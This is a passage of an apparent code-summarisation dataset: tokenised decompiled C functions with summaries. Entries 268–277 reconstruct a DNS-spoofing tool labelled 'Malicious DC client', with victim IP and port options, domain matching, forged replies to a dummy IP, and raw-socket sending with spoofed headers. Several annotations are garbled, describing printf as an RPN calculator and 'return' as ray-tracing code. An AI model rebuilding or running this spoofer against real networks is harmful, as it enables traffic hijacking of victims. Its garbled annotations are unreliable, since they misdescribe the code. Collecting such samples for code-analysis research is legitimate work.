            "[",
            "9",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"checksum %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "10",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "11",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Source %02x %02x %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "12",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "13",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "14",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "15",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Dest %02x %02x %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "16",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "17",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "18",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "19",
            "]",
            ")",
            ";",
            "puts",
            "(",
            "\"DNS HEADER\"",
            ")",
            ";",
            "printf",
            "(",
            "\"Port %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "20",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "21",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Dest port %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "22",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "23",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Length %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "24",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "25",
            "]",
            ")",
            ";",
            "return",
            "printf",
            "(",
            "\"checksum %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "26",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "27",
            "]",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `printf` function is being redefined and utilized within the provided code snippets to create an RPN calculator and handle formatting, including special cases for different operating systems, while maintaining compatibility with the standard `printf` function."
        ],
        "longer_label": "The provided code is a function named `printDnsPacket` which parses a DNS packet, printing out various fields such as IP header, DNS header, and checksums, utilizing `printf` function with annotations suggesting possible redefinition and usage for creating an RPN calculator and handling formatting for different operating systems while maintaining compatibility with the standard `printf` function."
    },
    {
        "id": 268,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "named",
            "myrkur_help",
            "that",
            "prints",
            "out",
            "usage",
            "instructions",
            "for",
            "a",
            "malicious",
            "DC",
            "client",
            "program",
            "called",
            "Myrkur",
            ",",
            "including",
            "options",
            "for",
            "specifying",
            "host",
            "IP",
            ",",
            "host",
            "port",
            ",",
            "victim",
            "IP",
            ",",
            "victim",
            "port",
            ",",
            "and",
            "displaying",
            "a",
            "help",
            "message",
            "."
        ],
        "code_tokens": [
            "size_t",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"Usage: %s [OPTION]\\n\"",
            ",",
            "a1",
            ")",
            ";",
            "fwrite",
            "(",
            "\"Myrkur: Malicious DC client\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1CuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -i, --hostip\\t\\tSpecify host IP\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x20uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -p, --hostport\\tSpecify host port\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x23uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -j, --victimip\\tSpecify victim IP\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x23uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "fwrite",
            "(",
            "\"  -k, --victimport\\tSpecify victim port\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x27uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "fwrite",
            "(",
            "\"  -h, --help\\t\\tDisplay this help message\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x28uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function `myrkur_help` which prints usage information and options for a malicious DC client, specifying host and victim IP addresses and ports, and returning the number of characters written to the standard error stream."
    },
    {
        "id": 269,
        "docstring_tokens": [
            "The",
            "code",
            "takes",
            "a",
            "DNS",
            "request",
            "structure",
            "and",
            "extracts",
            "the",
            "domain",
            "name",
            "from",
            "the",
            "DNS",
            "data",
            ",",
            "storing",
            "it",
            "in",
            "the",
            "``",
            "request_domain",
            "''",
            "field",
            "of",
            "the",
            "request",
            "structure",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "int",
            "v2",
            ";",
            "int",
            "v3",
            ";",
            "int",
            "v4",
            ";",
            "__int64",
            "result",
            ";",
            "int",
            "v6",
            ";",
            "int",
            "v7",
            ";",
            "int",
            "v8",
            ";",
            "int",
            "i",
            ";",
            "char",
            "*",
            "v10",
            ";",
            "v10",
            "=",
            "*",
            "(",
            "char",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            ";",
            "v6",
            "=",
            "*",
            "v10",
            ";",
            "v7",
            "=",
            "0",
            ";",
            "v8",
            "=",
            "1",
            ";",
            "while",
            "(",
            "v6",
            ">",
            "0",
            ")",
            "{",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "i",
            "<",
            "v6",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v2",
            "=",
            "v7",
            "+",
            "+",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "v2",
            ")",
            "=",
            "v10",
            "[",
            "i",
            "+",
            "v8",
            "]",
            ";",
            "}",
            "v3",
            "=",
            "v7",
            "+",
            "+",
            ";",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v3",
            "+",
            "a2",
            ")",
            "=",
            "46",
            ";",
            "v4",
            "=",
            "v6",
            "+",
            "v8",
            ";",
            "v8",
            "+",
            "=",
            "v6",
            "+",
            "1",
            ";",
            "v6",
            "=",
            "v10",
            "[",
            "v4",
            "]",
            ";",
            "}",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "v7",
            "-",
            "1",
            "+",
            "a2",
            ")",
            "=",
            "0",
            ";",
            "result",
            "=",
            "a1",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "40",
            ")",
            "=",
            "a2",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code is a function that extracts a domain name from a DNS request packet, parses it, and stores it into a buffer, returning the initial value of `a1`."
    },
    {
        "id": 270,
        "docstring_tokens": [
            "The",
            "function",
            "`",
            "copy16",
            "`",
            "copies",
            "a",
            "16-bit",
            "data",
            "value",
            "into",
            "a",
            "character",
            "array",
            "by",
            "storing",
            "the",
            "least",
            "significant",
            "byte",
            "in",
            "the",
            "first",
            "element",
            "and",
            "the",
            "most",
            "significant",
            "byte",
            "in",
            "the",
            "second",
            "element",
            "."
        ],
        "code_tokens": [
            "char",
            "*",
            "FUN0",
            "copy16",
            "(",
            "_WORD",
            "*",
            "a1",
            ",",
            "__int16",
            "a2",
            ")",
            "{",
            "*",
            "a1",
            "=",
            "a2",
            ";",
            "return",
            "(",
            "char",
            "*",
            ")",
            "a1",
            "+",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function named `copy16` which takes a pointer to a 16-bit integer (`a1`) and a 16-bit integer (`a2`), assigns the value of `a2` to the memory location pointed to by `a1`, and returns a pointer to the next memory location."
    },
    {
        "id": 271,
        "docstring_tokens": [
            "The",
            "function",
            "copy32",
            "takes",
            "an",
            "unsigned",
            "32-bit",
            "integer",
            "data",
            "and",
            "copies",
            "its",
            "individual",
            "bytes",
            "into",
            "the",
            "result",
            "array",
            "."
        ],
        "code_tokens": [
            "_BYTE",
            "*",
            "FUN0",
            "copy32",
            "(",
            "_BYTE",
            "*",
            "a1",
            ",",
            "unsigned",
            "int",
            "a2",
            ")",
            "{",
            "_BYTE",
            "*",
            "result",
            ";",
            "*",
            "a1",
            "=",
            "a2",
            ";",
            "a1",
            "[",
            "1",
            "]",
            "=",
            "a2",
            ">",
            ">",
            "8",
            "!",
            "=",
            "0",
            ";",
            "a1",
            "[",
            "2",
            "]",
            "=",
            "HIWORD",
            "(",
            "a2",
            ")",
            "!",
            "=",
            "0",
            ";",
            "result",
            "=",
            "a1",
            "+",
            "3",
            ";",
            "a1",
            "[",
            "3",
            "]",
            "=",
            "HIBYTE",
            "(",
            "a2",
            ")",
            "!",
            "=",
            "0",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code defines a function \"copy32\" that copies a 32-bit value into a byte array and sets certain bytes based on conditions, with annotations missing for further clarity."
    },
    {
        "id": 272,
        "docstring_tokens": [
            "The",
            "code",
            "prepares",
            "IP",
            "and",
            "UDP",
            "headers",
            "for",
            "a",
            "DNS",
            "request",
            ",",
            "setting",
            "the",
            "total",
            "length",
            ",",
            "destination",
            "and",
            "source",
            "addresses",
            ",",
            "port",
            "numbers",
            ",",
            "lengths",
            ",",
            "and",
            "copying",
            "the",
            "headers",
            "to",
            "a",
            "reply",
            "buffer",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int16",
            "a3",
            ",",
            "uint16_t",
            "a4",
            ")",
            "{",
            "__int64",
            "result",
            ";",
            "int",
            "v7",
            ";",
            "_WORD",
            "*",
            "src",
            ";",
            "uint16_t",
            "*",
            "v9",
            ";",
            "src",
            "=",
            "*",
            "(",
            "_WORD",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            ";",
            "v9",
            "=",
            "*",
            "(",
            "uint16_t",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "16",
            ")",
            ";",
            "src",
            "[",
            "1",
            "]",
            "=",
            "htons",
            "(",
            "a3",
            "+",
            "28",
            ")",
            ";",
            "v7",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "16L",
            "L",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "4",
            ")",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "12L",
            "L",
            ")",
            ";",
            "*",
            "(",
            "(",
            "_DWORD",
            "*",
            ")",
            "src",
            "+",
            "3",
            ")",
            "=",
            "v7",
            ";",
            "*",
            "v9",
            "=",
            "htons",
            "(",
            "0x35u",
            ")",
            ";",
            "v9",
            "[",
            "1",
            "]",
            "=",
            "htons",
            "(",
            "a4",
            ")",
            ";",
            "v9",
            "[",
            "2",
            "]",
            "=",
            "htons",
            "(",
            "a3",
            "+",
            "8",
            ")",
            ";",
            "v9",
            "[",
            "3",
            "]",
            "=",
            "0",
            ";",
            "memcpy",
            "(",
            "(",
            "void",
            "*",
            ")",
            "a2",
            ",",
            "src",
            ",",
            "0x14uL",
            "L",
            ")",
            ";",
            "result",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "20",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "v9",
            ";",
            "return",
            "result",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `htons` appears to be used for converting a 16-bit value from host byte order to network byte order, typically used for network communication protocols like TCP/IP."
        ],
        "longer_label": "The provided code is a function named `prepare_ip_and_udp_headers` which prepares IP and UDP headers by setting various fields, converting values to network byte order using `htons`, and copying memory, likely for network packet construction."
    },
    {
        "id": 273,
        "docstring_tokens": [
            "The",
            "code",
            "prepares",
            "a",
            "DNS",
            "reply",
            "by",
            "copying",
            "various",
            "data",
            "elements",
            "such",
            "as",
            "IDs",
            ",",
            "counts",
            ",",
            "and",
            "IP",
            "addresses",
            "into",
            "a",
            "reply",
            "buffer",
            "and",
            "returns",
            "the",
            "total",
            "size",
            "of",
            "the",
            "reply",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "_WORD",
            "*",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "n",
            ";",
            "int",
            "n_4",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "copy16",
            "(",
            "a2",
            ",",
            "*",
            "*",
            "(",
            "_WORD",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            ")",
            ";",
            "copy16",
            "(",
            "a2",
            "+",
            "1",
            ",",
            "32897",
            ")",
            ";",
            "copy16",
            "(",
            "a2",
            "+",
            "2",
            ",",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            "+",
            "4L",
            "L",
            ")",
            ")",
            ";",
            "copy16",
            "(",
            "a2",
            "+",
            "3",
            ",",
            "256",
            ")",
            ";",
            "copy16",
            "(",
            "a2",
            "+",
            "4",
            ",",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            "+",
            "8L",
            "L",
            ")",
            ")",
            ";",
            "copy16",
            "(",
            "a2",
            "+",
            "5",
            ",",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "24",
            ")",
            "+",
            "10L",
            "L",
            ")",
            ")",
            ";",
            "n",
            "=",
            "strlen",
            "(",
            "*",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            ")",
            "+",
            "1",
            ";",
            "memcpy",
            "(",
            "a2",
            "+",
            "6",
            ",",
            "*",
            "(",
            "const",
            "void",
            "*",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "32",
            ")",
            ",",
            "n",
            ")",
            ";",
            "copy16",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "12",
            ")",
            ",",
            "256",
            ")",
            ";",
            "copy16",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "14",
            ")",
            ",",
            "256",
            ")",
            ";",
            "copy16",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "16",
            ")",
            ",",
            "3264",
            ")",
            ";",
            "copy16",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "18",
            ")",
            ",",
            "256",
            ")",
            ";",
            "copy16",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "20",
            ")",
            ",",
            "256",
            ")",
            ";",
            "copy32",
            "(",
            "(",
            "_BYTE",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "22",
            ",",
            "0x34000000u",
            ")",
            ";",
            "copy16",
            "(",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "26",
            ")",
            ",",
            "1024",
            ")",
            ";",
            "__isoc99_sscanf",
            "(",
            "dummy_ip",
            ",",
            "\"%d.%d.%d.%d\"",
            ",",
            "&",
            "n_4",
            ",",
            "(",
            "char",
            "*",
            ")",
            "&",
            "n_4",
            "+",
            "1",
            ",",
            "(",
            "char",
            "*",
            ")",
            "&",
            "n_4",
            "+",
            "2",
            ",",
            "(",
            "char",
            "*",
            ")",
            "&",
            "n_4",
            "+",
            "3",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "a2",
            "+",
            "n",
            "+",
            "28",
            ")",
            "=",
            "n_4",
            ";",
            "return",
            "n",
            "+",
            "32",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `strlen` calculates the length of a null-terminated string by iterating through its characters until it encounters the null terminator ('\\0')."
        ],
        "longer_label": "The provided code is a function `prepare_dns_reply` which prepares a DNS reply by copying specific data into the provided buffer `a2`, including copying strings and converting an IP address from a dummy variable `dummy_ip`, and it returns the total length of the prepared reply."
    },
    {
        "id": 274,
        "docstring_tokens": [
            "The",
            "code",
            "checks",
            "the",
            "DNS",
            "domain",
            "of",
            "an",
            "incoming",
            "packet",
            "and",
            "returns",
            "the",
            "port",
            "number",
            "if",
            "the",
            "domain",
            "matches",
            "with",
            "the",
            "requested",
            "domain",
            ",",
            "otherwise",
            "returns",
            "-1",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ")",
            "{",
            "unsigned",
            "int",
            "v3",
            ";",
            "char",
            "needle",
            "[",
            "72",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v5",
            ";",
            "v5",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "8",
            ")",
            "=",
            "a1",
            "+",
            "14",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            "=",
            "a1",
            "+",
            "4",
            "*",
            "(",
            "*",
            "*",
            "(",
            "_BYTE",
            "*",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "8",
            ")",
            "&",
            "0xF",
            ")",
            "+",
            "14L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "24",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            "+",
            "8L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "32",
            ")",
            "=",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "24",
            ")",
            "+",
            "12L",
            "L",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "48",
            ")",
            "=",
            "ntohs",
            "(",
            "*",
            "*",
            "(",
            "_DWORD",
            "*",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ")",
            ";",
            "v3",
            "=",
            "ntohs",
            "(",
            "*",
            "*",
            "(",
            "_DWORD",
            "*",
            "*",
            ")",
            "(",
            "a2",
            "+",
            "16",
            ")",
            ")",
            ";",
            "get_dns_request_domain",
            "(",
            "a2",
            ",",
            "(",
            "__int64",
            ")",
            "needle",
            ")",
            ";",
            "if",
            "(",
            "strstr",
            "(",
            "domain",
            ",",
            "needle",
            ")",
            ")",
            "return",
            "v3",
            ";",
            "else",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `dns_request` function likely handles DNS request processing and management, including parsing DNS packets, managing server information, and handling various request-related parameters and flags."
        ],
        "longer_label": "The provided code is a function named `check_dns_domain` which reads and processes DNS request data, extracts the domain from the request, compares it with a given needle using `strstr`, and returns the domain if found, otherwise returns 0xFFFFFFFF."
    },
    {
        "id": 275,
        "docstring_tokens": [
            "The",
            "code",
            "sends",
            "a",
            "UDP",
            "packet",
            "with",
            "a",
            "DNS",
            "request",
            "and",
            "specified",
            "reply",
            "data",
            "over",
            "a",
            "raw",
            "socket",
            ",",
            "setting",
            "the",
            "IP",
            "header",
            "inclusion",
            "option",
            "and",
            "handling",
            "errors",
            "if",
            "the",
            "socket",
            "creation",
            "or",
            "sending",
            "of",
            "the",
            "packet",
            "fails",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "__int64",
            "a1",
            ",",
            "const",
            "void",
            "*",
            "a2",
            ",",
            "unsigned",
            "int",
            "a3",
            ",",
            "uint16_t",
            "a4",
            ")",
            "{",
            "int",
            "optval",
            ";",
            "int",
            "fd",
            ";",
            "unsigned",
            "int",
            "v9",
            ";",
            "struct",
            "sockaddr",
            "addr",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "fd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "3",
            ",",
            "255",
            ")",
            ";",
            "if",
            "(",
            "fd",
            ">",
            "=",
            "0",
            ")",
            "{",
            "addr",
            ".",
            "sa_family",
            "=",
            "2",
            ";",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "addr",
            ".",
            "sa_data",
            "=",
            "htons",
            "(",
            "a4",
            ")",
            ";",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "&",
            "addr",
            ".",
            "sa_data",
            "[",
            "2",
            "]",
            "=",
            "*",
            "(",
            "_DWORD",
            "*",
            ")",
            "(",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "(",
            "a1",
            "+",
            "8",
            ")",
            "+",
            "16L",
            "L",
            ")",
            ";",
            "optval",
            "=",
            "1",
            ";",
            "if",
            "(",
            "setsockopt",
            "(",
            "fd",
            ",",
            "0",
            ",",
            "3",
            ",",
            "&",
            "optval",
            ",",
            "4u",
            ")",
            "<",
            "0",
            ")",
            "puts",
            "(",
            "\"setsockopt hdrincl error\"",
            ")",
            ";",
            "v9",
            "=",
            "sendto",
            "(",
            "fd",
            ",",
            "a2",
            ",",
            "a3",
            ",",
            "0",
            ",",
            "&",
            "addr",
            ",",
            "0x10u",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v9",
            "&",
            "0x80000000",
            ")",
            "=",
            "=",
            "0",
            ")",
            "{",
            "printf",
            "(",
            "\"sent %d bytes\\n\"",
            ",",
            "v9",
            ")",
            ";",
            "return",
            "v9",
            ";",
            "}",
            "else",
            "{",
            "printf",
            "(",
            "\"error sending udp %d\\n\"",
            ",",
            "v9",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"cannot create socket to send reply\"",
            ")",
            ";",
            "return",
            "0xFFFFFFFFL",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is likely used to read a 64-bit quadword (8 bytes) from a specific offset within the FS segment register, commonly utilized in low-level programming for accessing thread information or processor-specific data structures on x86 architectures.",
            "The `printf` function, defined with custom macros and typedefs, appears to be part of a larger system or framework, likely implementing an RPN (Reverse Polish Notation) calculator, with potential additional functionality for handling formatting and system-specific behaviors."
        ],
        "longer_label": "The provided code is a function for sending UDP packets, which creates a socket, sets socket options, prepares and sends the packet, and handles errors, with annotations describing the purpose of the `__readfsqword` and `printf` functions within a potentially larger system or framework."
    },
    {
        "id": 276,
        "docstring_tokens": [
            "The",
            "code",
            "sends",
            "a",
            "DNS",
            "reply",
            "message",
            "to",
            "a",
            "specific",
            "port",
            "based",
            "on",
            "a",
            "DNS",
            "request",
            "received",
            ",",
            "preparing",
            "the",
            "necessary",
            "headers",
            "and",
            "sending",
            "the",
            "reply",
            "using",
            "UDP",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "dns_reply",
            "(",
            "__int64",
            "a1",
            ",",
            "uint16_t",
            "a2",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "char",
            "s",
            "[",
            "28",
            "]",
            ";",
            "__int16",
            "v5",
            "[",
            "502",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v6",
            ";",
            "v6",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x400uL",
            "L",
            ")",
            ";",
            "v3",
            "=",
            "prepare_dns_reply",
            "(",
            "a1",
            ",",
            "v5",
            ")",
            ";",
            "prepare_ip_and_udp_headers",
            "(",
            "a1",
            ",",
            "(",
            "__int64",
            ")",
            "s",
            ",",
            "v3",
            ",",
            "a2",
            ")",
            ";",
            "send_udp",
            "(",
            "a1",
            ",",
            "s",
            ",",
            "v3",
            "+",
            "28",
            ",",
            "a2",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v6",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is likely used to read a 64-bit value from the FS segment register on x86 architecture, providing access to thread information block or other thread-specific data.",
            "The `memset` function is implemented in various ways across multiple code snippets provided, including custom implementations in `aw_malloc.c` and a steal from the runtime in `__sel4runtime_memset`, all serving the purpose of setting a block of memory to a specific value, typically used for initialization or clearing memory buffers.",
            "The `_dns_` function appears to be a DNS resolver function implemented in C, likely used for parsing DNS messages and resolving domain names to IP addresses within a networking or socket programming context.",
            "The function `ModificationOfIPsecESPPacket` is designed to modify an IPsec ESP packet by updating the UDP header and potentially other fields, such as IP headers, based on the provided IP packet and its characteristics, aimed at facilitating network traffic management or security enforcement.",
            "The \"return\" function likely pertains to a graphics or visualization program, possibly related to ray tracing or image rendering, incorporating a capsule-signed distance function (SDF) for shape calculations, a struct \"Result\" for storing SDF and emissive values, and an InterceptionContext for device interception in a C program with a main function that prints \"Hello World.\"",
            "The function `readfsqword` likely reads an unsigned 64-bit integer from the FS segment register in x86 assembly language, typically used for accessing thread-local storage or other system-specific data structures, as indicated by its corresponding macro definition and usage within assembly-level code snippets."
        ],
        "longer_label": "The code is a DNS reply function in C, likely part of a DNS resolver, which prepares a DNS reply message including IP and UDP headers, sends it over UDP, and returns a value XORed with a thread-specific data read from the FS segment register on x86 architecture."
    },
    {
        "id": 277,
        "docstring_tokens": [
            "The",
            "function",
            "handleframe",
            "processes",
            "a",
            "DNS",
            "request",
            "frame",
            ",",
            "checks",
            "the",
            "packet",
            "type",
            ",",
            "and",
            "if",
            "it",
            "is",
            "a",
            "HOST",
            "packet",
            ",",
            "checks",
            "the",
            "DNS",
            "domain",
            "and",
            "sends",
            "a",
            "DNS",
            "reply",
            "if",
            "valid",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "handleframe",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "int",
            "v5",
            ";",
            "char",
            "s",
            "[",
            "56",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "v7",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "s",
            ")",
            ")",
            ";",
            "if",
            "(",
            "!",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "a3",
            "+",
            "10",
            ")",
            ")",
            "{",
            "v5",
            "=",
            "check_dns_domain",
            "(",
            "a1",
            ",",
            "(",
            "__int64",
            ")",
            "s",
            ")",
            ";",
            "if",
            "(",
            "v5",
            ">",
            "0",
            ")",
            "dns_reply",
            "(",
            "(",
            "__int64",
            ")",
            "s",
            ",",
            "v5",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v7",
